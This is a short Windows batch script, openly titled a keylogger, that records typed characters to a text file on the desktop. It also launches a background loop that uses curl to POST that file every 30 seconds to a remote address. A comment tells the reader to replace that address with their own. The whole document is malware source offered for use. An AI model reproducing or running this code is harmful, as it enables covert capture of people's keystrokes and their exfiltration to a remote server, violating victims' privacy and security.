:: Authors: Daniel DeBrun, inspired by https://github.com/TheBATeam/Keylogger-in-Batch-1.0
@echo off
cls
title Keylogger-Batch Ver. 1.0
set "list=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set entry=
:: Replace 'https://example.net' with your desired address
start "Increment Thread" cmd /c "for /l %%i in (1,1,99999999) do (curl -d "@%userprofile%\desktop\keylogger.txt" -H "Content-Type: text/plain" -X POST https://example.net & timeout /t 30 /nobreak >nul)"
:a
echo.&echo.Check the log file of pressed Keys in ur "desktop\keylogger.txt"
set a=
choice /n /c "%list%" /CS
set /a a=%errorlevel%-1

::creating temp. variables and checking which key is pressed....

set temp_list=%list%
set b=0
:loop
if "%b%" neq "%a%" (
set temp_list=%temp_list:~1%
set /a b=%b%+1
goto loop
)
set "entry=%entry%%temp_list:~0,1%"
echo.%entry%>"%userprofile%\desktop\keylogger.txt"
cls
echo.%entry%
goto a
